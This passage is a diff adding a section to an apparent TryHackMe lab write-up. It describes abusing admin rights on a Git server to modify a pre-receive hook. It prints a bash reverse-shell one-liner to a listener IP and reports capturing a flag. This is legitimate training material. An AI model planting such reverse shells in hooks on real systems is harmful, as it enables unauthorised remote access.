@@ -313,4 +313,29 @@ Although the secret isn't in the plain text but checking the source code of the 
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4213d367-2c71-4adc-b5aa-d1bc0b1b34f2)
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Initial access:
+
+Since Leeroy is having the admin access on the Git instance, I was able to modify the GitHooks. Leveraging this situation I modified the pre-receive hook & added the bash reverse shell in it.
+I also started my netcat listener to listen for the reverse shell:
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.6.79.71/53 0>&1'
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/fc7bdc7d-d053-4627-bda4-e01309a147eb)
+
+After updating the hook, I went back to the Leeroy readme.md & just added another "!" to update new changes, once I clicked on the update I got the reverse shell back to my listener, running as a user "git":
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c59a891b-fcb0-453e-b661-ea5416348f48)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### Flag2:
+
+Once getting the initial access I started with the manual enumeration & while checking the root directory I found that I am having all access on the root folder.
+Also, the root folder conatins the second flag in for which I am having the sufficient access to cat the file: (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e6f858da-bdaa-47ec-9af6-149cc3b18065)
+
 
